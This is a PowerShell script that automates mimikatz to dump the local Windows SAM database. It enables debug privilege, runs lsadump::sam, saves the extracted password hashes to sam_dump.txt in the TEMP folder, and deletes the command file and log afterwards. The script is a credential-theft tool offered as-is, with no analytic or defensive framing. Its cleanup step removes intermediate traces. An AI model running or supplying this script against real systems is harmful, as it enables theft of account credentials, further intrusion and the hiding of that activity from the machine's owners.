# Define the path to the mimikatz executable
$mimikatzPath = "C:\path\to\mimikatz.exe"

# Create a mimikatz command script
$mimikatzCommand = @"
privilege::debug
log $env:TEMP\mimikatz.log
lsadump::sam
log
exit
"@

# Write the command to a file
$mimikatzCommandPath = "$env:TEMP\mimikatz_command.txt"
$mimikatzCommand | Out-File -FilePath $mimikatzCommandPath

# Run mimikatz with the command script
Start-Process -FilePath $mimikatzPath -ArgumentList "-script $mimikatzCommandPath" -Wait -NoNewWindow

# Read the output log
$mimikatzLogPath = "$env:TEMP\mimikatz.log"
$mimikatzOutput = Get-Content -Path $mimikatzLogPath

# Save the output to a file
$outputPath = "$env:TEMP\sam_dump.txt"
$mimikatzOutput | Out-File -FilePath $outputPath

# Clean up
Remove-Item -Path $mimikatzCommandPath
Remove-Item -Path $mimikatzLogPath
